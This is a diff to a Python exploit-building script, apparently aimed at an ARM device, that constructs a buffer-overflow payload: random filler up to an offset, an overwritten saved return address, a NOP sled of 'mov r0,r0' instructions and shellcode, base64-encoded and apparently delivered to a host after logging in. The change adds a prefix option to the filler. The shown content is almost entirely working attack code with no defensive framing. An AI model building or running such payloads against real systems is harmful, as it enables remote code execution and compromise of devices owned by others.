@@ -37,10 +37,11 @@ def build_shellcode():
 SLED = b"\x00\x00\xa0\xe1"   # mov r0,r0 (repeat to length at build time)
 
 
-def build(offset, marker=None, addr=None, sled=0, padpc=1):
+def build(offset, marker=None, addr=None, sled=0, padpc=1, prefix=b""):
     """marker/addr overwrite the saved lr at `offset`; sled is prepended to the shellcode."""
     sc = build_shellcode()
-    filler = bytes(random.getrandbits(8) for _ in range(offset))
+    pre = prefix + b"\x00" if prefix else b""
+    filler = pre + bytes(random.getrandbits(8) for _ in range(max(0, offset - len(pre))))
     val = marker if marker is not None else addr
     pc = (val.to_bytes(4, "little") * max(1, padpc)) if val is not None else b""
     return base64.b64encode(filler + pc + SLED * (sled // 4) + sc).decode()
@@ -113,6 +114,7 @@ def main():
     ap.add_argument("--addr", type=lambda x: int(x, 0), default=None)
     ap.add_argument("--sled", type=int, default=0)
     ap.add_argument("--padpc", type=int, default=1)
+    ap.add_argument("--prefix", default="")
     ap.add_argument("--count", type=int, default=40)
     ap.add_argument("--step", type=lambda x: int(x, 0), default=0x200)
     a = ap.parse_args()
@@ -140,7 +142,7 @@ def main():
                 sess = login(a.host, tries=40)
         return
 
-    b64 = build(a.offset, a.marker, a.addr, a.sled, a.padpc)
+    b64 = build(a.offset, a.marker, a.addr, a.sled, a.padpc, a.prefix.encode())
     if a.mode == "build":
         if a.out:
             open(a.out, "w").write(b64)
